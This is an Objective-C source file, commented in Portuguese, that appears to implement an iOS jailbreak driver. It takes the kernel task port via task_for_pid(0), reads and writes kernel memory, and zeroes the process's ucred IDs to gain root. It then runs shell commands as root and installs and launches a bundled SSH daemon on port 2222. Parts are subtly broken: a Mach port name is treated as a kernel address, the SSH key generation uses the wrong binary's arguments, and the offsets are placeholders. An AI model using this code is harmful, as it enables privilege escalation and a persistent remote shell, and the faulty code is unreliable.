// KernelDriver.m
#import "KernelDriver.h"
#import <mach/mach.h>
#import <spawn.h>
#import <sys/wait.h>
#import <unistd.h>
#import <string.h>
#import <errno.h>

// Declarações necessárias para APIs do kernel
extern kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
extern kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outSize);
extern char **environ;

// Offsets comuns para iOS 26.4 (exemplo, podem variar)
#define OFFSET_TASK_BSD_INFO     0x470   // task → proc
#define OFFSET_PROC_UCRED        0x110   // proc → ucred
#define OFFSET_UCRED_UID         0x18
#define OFFSET_UCRED_RUID        0x1C
#define OFFSET_UCRED_SVUID       0x20
#define OFFSET_UCRED_NGROUPS     0x24
#define OFFSET_UCRED_GROUPS      0x28

@implementation KernelDriver {
    mach_port_t _tfp0;  // task port do kernel
}

- (instancetype)init {
    if (self = [super init]) {
        _tfp0 = MACH_PORT_NULL;
        // Obtém a task port do kernel via task_for_pid(0)
        kern_return_t kr = task_for_pid(mach_task_self(), 0, &_tfp0);
        if (kr != KERN_SUCCESS) {
            NSLog(@"[!] task_for_pid falhou: %s", mach_error_string(kr));
        }
    }
    return self;
}

// Leitura de 64 bits do kernel
- (uint64_t)kread64:(uint64_t)addr {
    if (_tfp0 == MACH_PORT_NULL) return 0;
    uint64_t value = 0;
    mach_vm_size_t outSize = 0;
    kern_return_t kr = mach_vm_read_overwrite(_tfp0, (mach_vm_address_t)addr, sizeof(value), (mach_vm_address_t)&value, &outSize);
    if (kr != KERN_SUCCESS || outSize != sizeof(value)) {
        return 0;
    }
    return value;
}

// Escrita de 64 bits no kernel
- (void)kwrite64:(uint64_t)addr value:(uint64_t)val {
    if (_tfp0 == MACH_PORT_NULL) return;
    mach_vm_write(_tfp0, (mach_vm_address_t)addr, (vm_offset_t)&val, (mach_msg_type_number_t)sizeof(val));
}

// Escrita de 32 bits no kernel
- (void)kwrite32:(uint64_t)addr value:(uint32_t)val {
    if (_tfp0 == MACH_PORT_NULL) return;
    mach_vm_write(_tfp0, (mach_vm_address_t)addr, (vm_offset_t)&val, (mach_msg_type_number_t)sizeof(val));
}

// Localiza o endereço da struct proc do próprio processo via tfp0
- (uint64_t)find_self_proc {
    // Obtém a task port do próprio processo
    mach_port_t self_task = mach_task_self();
    // Lê o ponteiro bsd_info dentro da struct task
    uint64_t proc_addr = [self kread64:(uint64_t)self_task + OFFSET_TASK_BSD_INFO];
    return proc_addr;
}

- (NSString *)executeShell:(NSString *)cmd {
    pid_t pid;
    int pipefd[2];
    if (pipe(pipefd) == -1) {
        return @"[!] pipe falhou";
    }

    posix_spawn_file_actions_t actions;
    posix_spawn_file_actions_init(&actions);
    posix_spawn_file_actions_adddup2(&actions, pipefd[1], STDOUT_FILENO);
    posix_spawn_file_actions_adddup2(&actions, pipefd[1], STDERR_FILENO);
    posix_spawn_file_actions_addclose(&actions, pipefd[0]);

    const char *args[] = {"sh", "-c", [cmd UTF8String], NULL};
    
    // Tentativa de spawn com root (se já tiver privilégios)
    setuid(0);
    setgid(0);
    
    int status = posix_spawn(&pid, "/bin/sh", &actions, NULL, (char* const*)args, environ);
    posix_spawn_file_actions_destroy(&actions);
    close(pipefd[1]);
    
    if (status == 0) {
        waitpid(pid, NULL, 0);
        char buffer[4096] = {0};
        ssize_t n = read(pipefd[0], buffer, sizeof(buffer) - 1);
        close(pipefd[0]);
        if (n > 0) {
            return [NSString stringWithUTF8String:buffer];
        }
        return @"[Executado sem saída]";
    } else {
        close(pipefd[0]);
        return [NSString stringWithFormat:@"[!] Erro posix_spawn: %d (%s)", status, strerror(status)];
    }
}

- (NSString *)prepareSSHDEnvironment {
    NSString *bundlePath = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
    if (!bundlePath) return @"[!] Binário sshd não encontrado no bundle";
    NSString *targetPath = @"/Library/Jailbreak/sshd";
    [self executeShell:[NSString stringWithFormat:@"mkdir -p /Library/Jailbreak"]];
    [self executeShell:[NSString stringWithFormat:@"cp \"%@\" \"%@\"", bundlePath, targetPath]];
    [self executeShell:[NSString stringWithFormat:@"chmod 755 \"%@\"", targetPath]];
    return targetPath;
}

- (NSString *)generateSSHKeys {
    [self executeShell:@"mkdir -p /Library/Jailbreak/etc"];
    NSString *bin = [self prepareSSHDEnvironment];
    if ([bin hasPrefix:@"[!"]) return bin;
    [self executeShell:[NSString stringWithFormat:@"\"%@\" -t rsa -f /Library/Jailbreak/etc/dropbear_rsa_host_key", bin]];
    return @"[+] Keys Generated";
}

- (void)escalatePrivileges {
    uint64_t self_proc = [self find_self_proc];
    if (self_proc == 0) {
        NSLog(@"[!] Falha ao obter self_proc");
        return;
    }
    uint64_t ucred = [self kread64:(self_proc + OFFSET_PROC_UCRED)];
    if (ucred == 0) {
        NSLog(@"[!] Falha ao obter ucred");
        return;
    }
    NSLog(@"[*] Corrompendo ucred em 0x%llx", ucred);
    
    [self kwrite32:(ucred + OFFSET_UCRED_UID) value:0];      // cr_uid
    [self kwrite32:(ucred + OFFSET_UCRED_RUID) value:0];     // cr_ruid
    [self kwrite32:(ucred + OFFSET_UCRED_SVUID) value:0];    // cr_svuid
    [self kwrite32:(ucred + OFFSET_UCRED_NGROUPS) value:0];  // cr_ngroups
    [self kwrite32:(ucred + OFFSET_UCRED_GROUPS) value:0];   // primeiro grupo
    
    NSLog(@"[+] Privilégios elevados via Kernel Write.");
}

- (NSString *)executeSSHD {
    NSString *bundlePath = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
    if (!bundlePath) return @"[!] sshd não encontrado no bundle";
    NSString *rootfsPath = @"/Library/Jailbreak/sshd";
    
    // Copia e prepara o binário
    [self executeShell:[NSString stringWithFormat:@"mkdir -p /Library/Jailbreak/etc"]];
    [self executeShell:[NSString stringWithFormat:@"cp \"%@\" \"%@\"", bundlePath, rootfsPath]];
    [self executeShell:[NSString stringWithFormat:@"chmod 755 \"%@\"", rootfsPath]];
    
    pid_t pid;
    const char *args[] = {
        [rootfsPath UTF8String],
        "-p", "2222",
        "-P", "/tmp/sshd.pid",
        "-r", "/Library/Jailbreak/etc/dropbear_rsa_host_key",
        "-E", "-R", NULL
    };
    
    setuid(0);
    setgid(0);
    
    int status = posix_spawn(&pid, [rootfsPath UTF8String], NULL, NULL, (char* const*)args, environ);
    if (status == 0) {
        return [NSString stringWithFormat:@"[+] SSHD migrado e ativo! PID: %d", pid];
    } else {
        return [NSString stringWithFormat:@"[-] Erro %d: %s. Tente 'Remount RW' novamente.", status, strerror(status)];
    }
}

@end
